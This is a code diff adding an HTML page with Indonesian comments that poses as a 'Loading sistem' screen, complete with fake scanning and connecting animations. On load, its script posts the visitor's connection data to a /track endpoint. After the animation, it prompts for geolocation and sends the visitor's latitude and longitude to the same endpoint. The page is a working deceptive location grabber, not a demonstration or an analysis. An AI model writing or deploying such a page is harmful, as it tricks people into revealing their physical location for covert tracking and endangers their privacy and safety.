@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loading...</title>
+</head>
+<body style="background:black; color:white; text-align:center; padding:50px; font-family:sans-serif;">
+
+<h2>🚀 Loading sistem...</h2>
+<p id="text">Starting...</p>
+
+<script>
+const koneksi = navigator.connection || {};
+const jenisKoneksi = koneksi.effectiveType || "unknown";
+
+// 🔥 STEP 1: kirim IP langsung
+fetch("/track", {
+  method: "POST",
+  headers: {"Content-Type": "application/json"},
+  body: JSON.stringify({
+    koneksi: jenisKoneksi,
+    type: "ip"
+  })
+});
+
+// 🔥 animasi Gen Z
+const teks = [
+  "Scanning device 📱...",
+  "Checking network 🌐...",
+  "Connecting system 🔗...",
+  "Finalizing ⚡..."
+];
+
+let i = 0;
+
+const interval = setInterval(() => {
+  document.getElementById("text").innerText = teks[i];
+  i++;
+  if (i >= teks.length) {
+    clearInterval(interval);
+
+    // 🔥 STEP 2: auto munculin izin lokasi
+    setTimeout(() => {
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(pos) {
+
+          fetch("/track", {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude,
+              koneksi: jenisKoneksi,
+              type: "gps"
+            })
+          });
+
+          document.body.innerHTML = "<h2>✔ Done</h2>";
+
+        }, function() {
+          document.body.innerHTML = "<h2>❌ Location denied</h2>";
+        });
+      }
+
+    }, 800);
+
+  }
+}, 800);
+</script>
+
+</body>
+</html>
